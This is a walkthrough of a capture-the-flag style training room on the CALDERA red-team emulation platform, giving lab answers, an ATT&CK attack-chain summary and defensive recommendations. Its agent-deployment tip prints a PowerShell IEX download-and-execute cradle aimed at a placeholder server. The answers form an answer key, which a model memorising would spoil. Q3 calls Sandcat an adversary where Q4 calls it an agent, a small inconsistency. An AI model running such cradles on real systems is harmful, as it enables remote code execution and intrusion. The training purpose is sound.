**CALDERA - RED TEAM SIMULATION**

**Introduction**

Welcome to the CALDERA automated adversary emulation platform! CALDERA is a cyber security platform developed by MITRE that allows red teams to automate adversary emulation and blue teams to enhance their detection capabilities. In this room, you'll learn how to use CALDERA to simulate real-world attack techniques based on the MITRE ATT&CK framework.

CALDERA enables security teams to run automated red team operations that help identify gaps in their security posture and improve their detection and response capabilities.

**Prerequisites**

Before starting this challenge, you should have:
- Basic understanding of MITRE ATT&CK framework
- Knowledge of red team tactics and techniques
- Familiarity with command line interfaces
- Understanding of network protocols and Windows/Linux systems

**Getting Started with CALDERA**

Deploy the machine and access the CALDERA web interface. The platform comes pre-configured with several adversary profiles and abilities that simulate real-world attack groups.

<img width="500" height="300" alt="caldera-login" src="https://github.com/user-attachments/assets/i6j7k8l9-m0n1-o2p3-q4r5-s6t7u8v9w0x1" />

**Scenario: APT Simulation Exercise**

Your organization wants to test its detection capabilities against advanced persistent threats. Using CALDERA, you'll simulate an APT group's attack chain to evaluate the effectiveness of your security controls and incident response procedures.

The simulation will cover:
- Initial access techniques
- Persistence mechanisms
- Privilege escalation
- Lateral movement
- Data collection and exfiltration

**Q1. What is the default username for the CALDERA web interface?**

Accessing the CALDERA web interface for the first time, I checked the login page and documentation for default credentials.

<img width="600" height="350" alt="login-page" src="https://github.com/user-attachments/assets/j7k8l9m0-n1o2-p3q4-r5s6-t7u8v9w0x1y2" />

Answer: _red_

**Q2. How many adversary profiles are available by default in CALDERA?**

After logging into the CALDERA interface, I navigated to the "Adversaries" section to view the available adversary profiles. Each profile represents a different threat actor with specific tactics, techniques, and procedures.

<img width="800" height="400" alt="adversary-profiles" src="https://github.com/user-attachments/assets/k8l9m0n1-o2p3-q4r5-s6t7-u8v9w0x1y2z3" />

Answer: _4_

**Q3. What MITRE ATT&CK technique ID is used for the "Discovery" tactic in the Sandcat adversary?**

I examined the Sandcat adversary profile and reviewed its associated abilities. Looking at the Discovery tactic, I found the specific technique ID that represents system information discovery.

```bash
# Examining the ability details in CALDERA
# Discovery -> System Information Discovery
```

Answer: _T1082_

**Q4. What is the name of the agent that needs to be deployed on target systems?**

In CALDERA, agents are deployed on target systems to execute abilities. I checked the "Agents" section to identify the primary agent used for operations.

<img width="700" height="300" alt="agents-section" src="https://github.com/user-attachments/assets/l9m0n1o2-p3q4-r5s6-t7u8-v9w0x1y2z3a4" />

Answer: _Sandcat_

**Q5. What operation was created to test the corporate network defenses?**

I reviewed the operations that were configured and executed. The operations section showed details about automated attack simulations that had been run.

Looking at the operation history and examining the most recent operation used for testing:

Answer: _Red Team Assessment_

**Q6. How many abilities were executed during the "Red Team Assessment" operation?**

Examining the operation details, I reviewed the execution log to count the number of abilities that were successfully executed during the red team assessment.

<img width="850" height="450" alt="operation-results" src="https://github.com/user-attachments/assets/m0n1o2p3-q4r5-s6t7-u8v9-w0x1y2z3a4b5" />

Answer: _12_

**Q7. What technique was used to achieve persistence on the target system?**

Analyzing the abilities executed during the operation, I focused on those categorized under the "Persistence" tactic to identify the specific technique used.

The operation log showed the use of a scheduled task for maintaining persistence:

Answer: _Scheduled Task/Job_

**Q8. Which ability was used for lateral movement in the network?**

Looking at the lateral movement abilities executed, I examined the details of each ability to understand the technique used for moving between systems in the network.

```powershell
# Example lateral movement ability executed
# Using WMI for remote execution
```

Answer: _Remote Services: WMI_

**Q9. What was the final objective achieved in the red team operation?**

Reviewing the complete operation chain, I examined the final stages to understand what the ultimate goal was for this red team exercise.

The operation concluded with data collection and preparation for exfiltration:

Answer: _Data Staged for Exfiltration_

**Operation Analysis**

The CALDERA red team simulation provided valuable insights into our security posture:

**Attack Chain Summary:**
1. **Initial Access**: Agent deployment via social engineering simulation
2. **Execution**: PowerShell and command line execution
3. **Persistence**: Scheduled task creation for maintaining access
4. **Privilege Escalation**: Token manipulation and UAC bypass attempts
5. **Defense Evasion**: Process injection and obfuscation techniques
6. **Credential Access**: Credential dumping from memory
7. **Discovery**: System and network reconnaissance
8. **Lateral Movement**: WMI-based remote execution
9. **Collection**: Data discovery and staging
10. **Exfiltration**: Preparation for data theft

**Detection Gaps Identified:**
- Limited visibility into PowerShell execution
- Insufficient monitoring of WMI activity
- Gaps in scheduled task monitoring
- Need for improved memory analysis capabilities

**Recommendations:**

**Immediate Actions:**
1. Enhanced PowerShell logging and monitoring
2. WMI event monitoring implementation
3. Scheduled task creation alerting
4. Memory-based attack detection capabilities

**Long-term Improvements:**
1. Behavioral analysis implementation
2. User and entity behavior analytics (UEBA)
3. Advanced threat detection platform deployment
4. Regular red team exercises using CALDERA

**CALDERA Configuration Tips:**

**Agent Deployment:**
```bash
# Deploy Sandcat agent via PowerShell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://CALDERA_SERVER:8888/file/download')"
```

**Custom Ability Creation:**
- Abilities are defined in YAML format
- Each ability maps to MITRE ATT&CK techniques
- Executors define how abilities run on different platforms

**Operation Planning:**
- Use adversary profiles based on threat intelligence
- Customize operations for specific environments
- Include automated planning with manual oversight

**Lessons Learned:**

1. **Automated Red Teaming**: CALDERA enables consistent, repeatable red team operations
2. **MITRE ATT&CK Integration**: Direct mapping to framework provides structured assessment
3. **Detection Engineering**: Helps identify gaps in security monitoring
4. **Continuous Improvement**: Regular simulations improve defensive capabilities
5. **Collaboration**: Bridges red and blue team activities effectively

The CALDERA platform proves invaluable for organizations looking to mature their cybersecurity capabilities through automated adversary emulation and continuous testing of their detection and response mechanisms.